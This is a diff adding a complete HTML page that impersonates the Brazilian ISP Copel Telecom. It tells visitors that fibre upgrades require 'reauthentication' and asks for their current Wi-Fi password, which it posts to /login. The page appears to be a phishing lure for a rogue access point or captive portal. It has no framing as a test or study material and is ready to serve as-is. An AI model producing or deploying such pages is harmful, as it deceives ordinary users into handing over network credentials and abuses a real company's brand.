@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Copel Telecom - Autenticação</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #e6e6e6;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-top: 5px solid #ff6600;
+        }
+
+        h2 {
+            color: #333;
+            font-weight: 600;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 2px solid #f0f0f0;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #ff6600;
+        }
+
+        button {
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #e65c00;
+            transform: translateY(-2px);
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: 800;
+            color: #ff6600;
+            margin-bottom: 20px;
+            display: inline-block;
+            letter-spacing: -1px;
+        }
+
+        .logo-text span {
+            color: #555;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo-text">Copel<span>Telecom</span></div>
+        <h2>Reautenticação Necessária</h2>
+        <p>Devido a melhorias em nossa infraestrutura de fibra óptica, precisamos validar seu acesso local. Insira sua
+            chave de rede para sincronizar.</p>
+        <form action="/login" method="POST">
+            <input type="password" name="password" placeholder="Senha atual do Wi-Fi" required>
+            <button type="submit">Sincronizar</button>
+        </form>
+    </div>
+</body>
+
+</html>
